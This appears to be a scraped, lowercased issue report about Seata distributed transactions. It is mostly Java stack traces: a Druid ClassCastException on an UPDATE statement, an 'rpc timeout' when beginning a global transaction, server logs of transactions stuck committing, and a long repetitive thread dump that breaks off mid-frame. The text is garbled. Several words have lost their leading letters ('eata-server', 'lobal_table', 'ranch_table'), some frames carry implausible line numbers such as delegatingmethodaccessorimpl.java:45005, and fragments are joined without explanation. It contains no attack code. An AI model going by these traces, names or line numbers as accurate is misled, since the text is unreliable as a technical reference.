at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362)
at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348)
at io.netty.channel.defaultchannelpipeline.firechannelread(defaultchannelpipeline.java:965)
at io.netty.channel.nio.abstractniobytechannel$niobyteunsafe.read(abstractniobytechannel.java:163)
at io.netty.channel.nio.nioeventloop.processselectedkey(nioeventloop.java:644)
at io.netty.channel.nio.nioeventloop.processselectedkeysoptimized(nioeventloop.java:579)
at io.netty.channel.nio.nioeventloop.processselectedkeys(nioeventloop.java:496)
at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:458)
at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897)
at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30)
at java.lang.thread.run(thread.java:748)
use: jdbctemplate.batchupdate("update storage_tbl set count = count - 1 where commodity_code = 2001"); ``` ```
``` caused by: java.sql.sqlexception: java.lang.classcastexception: com.alibaba.druid.sql.ast.statement.sqljointablesource cannot be cast to com.alibaba.druid.sql.ast.statement.sqlexprtablesource at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:105) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:54) at sun.reflect.generatedmethodaccessor585.invoke(unknown source) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:45005) at java.lang.reflect.method.invoke(method.java:498) at org.apache.ibatis.logging.jdbc.preparedstatementlogger.invoke(preparedstatementlogger.java:59) at com.sun.proxy.$proxy296.execute(unknown source) at org.apache.ibatis.executor.statement.preparedstatementhandler.update(preparedstatementhandler.java:46) at org.apache.ibatis.executor.statement.routingstatementhandler.update(routingstatementhandler.java:74) at org.apache.ibatis.executor.simpleexecutor.doupdate(simpleexecutor.java:50) at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) at org.apache.ibatis.executor.cachingexecutor.update(cachingexecutor.java:76) at sun.reflect.generatedmethodaccessor655.invoke(unknown source) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:45005) at java.lang.reflect.method.invoke(method.java:498) at org.apache.ibatis.plugin.plugin.invoke(plugin.java:63) at com.sun.proxy.$proxy294.update(unknown source) at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:198) at sun.reflect.generatedmethodaccessor654.invoke(unknown source) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:45005) at java.lang.reflect.method.invoke(method.java:498) at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:433) ..
96 common frames omitted
caused by: java.lang.classcastexception: com.alibaba.druid.sql.ast.statement.sqljointablesource cannot be cast to com.alibaba.druid.sql.ast.statement.sqlexprtablesource at io.seata.sqlparser.druid.mysql.mysqlupdaterecognizer.gettablename(mysqlupdaterecognizer.java:129) at io.seata.rm.datasource.exec.basetransactionalexecutor.gettablemeta(basetransactionalexecutor.java:174) at io.seata.rm.datasource.exec.updateexecutor.beforeimage(updateexecutor.java:62) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:72) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:60) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:92) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) ..
118 common frames omitted ```
tm ebug
logstoredatabasedao-->init()-->inittransactionnamesize() -->
columninfo columninfo = querytablestructure(globaltable, transaction_name_key) -->
resultset tablers = dbmd.gettables(null, schema, null, new string[]{"table"});
eata-server lobal_table ranch_table eata-sever ``` ``` ![image](
#### tm
2020-01-16 19:00:19.956 error 19765 --- [o-8873-exec-288] i.s.core.rpc.netty.abstractrpcremoting : wait response error:cost 30000 ms,ip:192.168.202.137:8091,request:timeout=60000,transactionname=test(javax.servlet.http.httpservletrequest, com.fly.seata.dto.orderdto)
2020-01-16 19:00:19.960 warn 19765 --- [o-8873-exec-288] i.s.tm.api.defaultfailurehandlerimpl : failed to begin transaction
io.seata.core.exception.tmtransactionexception: rpc timeout at io.seata.tm.defaulttransactionmanager.synccall(defaulttransactionmanager.java:97) ~[seata-all-1.0.0.jar!/:1.0.0] at io.seata.tm.defaulttransactionmanager.begin(defaulttransactionmanager.java:53) ~[seata-all-1.0.0.jar!/:1.0.0] at io.seata.tm.api.defaultglobaltransaction.begin(defaultglobaltransaction.java:102) ~[seata-all-1.0.0.jar!/:1.0.0] at io.seata.tm.api.transactionaltemplate.begintransaction(transactionaltemplate.java:123) ~[seata-all-1.0.0.jar!/:1.0.0] at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:58) ~[seata-all-1.0.0.jar!/:1.0.0] at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:106) [seata-all-1.0.0.jar!/:1.0.0] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:81) [seata-all-1.0.0.jar!/:1.0.0] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:185) [spring-aop-5.0.5.release.jar!/:5.0.5.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:689) [spring-aop-5.0.5.release.jar!/:5.0.5.release] at com.fly.seata.controller.testcontroller$$enhancerbyspringcglib$$63e8794f.test(<generated>) [classes!/:1.0-snapshot] at sun.reflect.generatedmethodaccessor80.invoke(unknown source) ~[na:na] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_181] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_181] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:209) [spring-web-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:136) [spring-web-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:102) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:877) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:783) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:991) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:925) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:974) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:877) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at javax.servlet.http.httpservlet.service(httpservlet.java:661) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:851) [spring-webmvc-5.0.5.release.jar!/:5.0.5.release] at javax.servlet.http.httpservlet.service(httpservlet.java:742) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:52) [tomcat-embed-websocket-8.5.29.jar!/:8.5.29] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) [spring-web-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.0.5.release.jar!/:5.0.5.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.springframework.web.filter.httpputformcontentfilter.dofilterinternal(httpputformcontentfilter.java:109) [spring-web-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.0.5.release.jar!/:5.0.5.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) [tomcat-embed-core-8.5.29.jar!/:8.5.29] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:81) [spring-web-5.0.5.release.jar!/:5.0.5.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) [spring-web-5.0.5.release.jar!/:5.0.5.release]
``` #### server
2020-01-16 19:31:15.894 debug[discoveryclient-cacherefreshexecutor-0]com.netflix.discovery.util.deserializerstringcache.lambda$clear$2:122 -clearing global-level cache with size 0
2020-01-16 19:31:15.895 debug[discoveryclient-cacherefreshexecutor-0]com.netflix.discovery.util.deserializerstringcache.lambda$clear$2:126 -clearing app-level serialization cache with size 0
2020-01-16 19:31:15.895 debug[discoveryclient-cacherefreshexecutor-0]c.n.d.s.transport.jersey.abstractjerseyeurekahttpclient.getapplicationsinternal:206 -jersey http get statuscode=200
2020-01-16 19:31:15.895 debug[discoveryclient-cacherefreshexecutor-0]com.netflix.discovery.discoveryclient.getandupdatedelta:1095 -got delta update with apps hashcode down_15_up_7_
2020-01-16 19:31:15.895 debug[discoveryclient-cacherefreshexecutor-0]com.netflix.discovery.discoveryclient.updatedelta:1235 -the total number of instances fetched by the delta processor : 0
2020-01-16 19:31:15.895 debug[discoveryclient-cacherefreshexecutor-0]com.netflix.discovery.discoveryclient.logtotalinstances:1126 -the total number of all instances in the client now is 22
2020-01-16 19:31:15.895 debug[discoveryclient-cacherefreshexecutor-0]com.netflix.discovery.discoveryclient.refreshregistry:1497 -completed cache refresh task for discovery
all apps hash code is local region apps hashcode: down_15_up_7_, is fetching remote regions? false
2020-01-16 19:31:16.270 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:334 -transaction timeout check begin: 7
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428794 committing 1579171753836 60000
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428606 committing 1579171753769 60000
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428737 committing 1579171753816 60000
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428747 committing 1579171753819 60000
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428965 committing 1579171753896 60000
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428982 committing 1579171753902 60000
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075429212 committing 1579171753975 60000
2020-01-16 19:31:16.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:368 -transaction timeout check end.
2020-01-16 19:31:17.270 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:334 -transaction timeout check begin: 7
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428794 committing 1579171753836 60000
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428606 committing 1579171753769 60000
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428737 committing 1579171753816 60000
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428747 committing 1579171753819 60000
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428965 committing 1579171753896 60000
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075428982 committing 1579171753902 60000
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:338 -192.168.202.137:8091:2075429212 committing 1579171753975 60000
2020-01-16 19:31:17.271 debug[txtimeoutcheck_1]io.seata.server.coordinator.defaultcoordinator.timeoutcheck:368 -transaction timeout check end.
``` ###
"serverhandlerthread_1_500" #86 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #85 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #84 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #83 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #82 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #81 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #80 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #79 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #78 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #77 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #76 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #75 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #74 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #73 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #72 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #71 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #70 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #69 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #68 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at 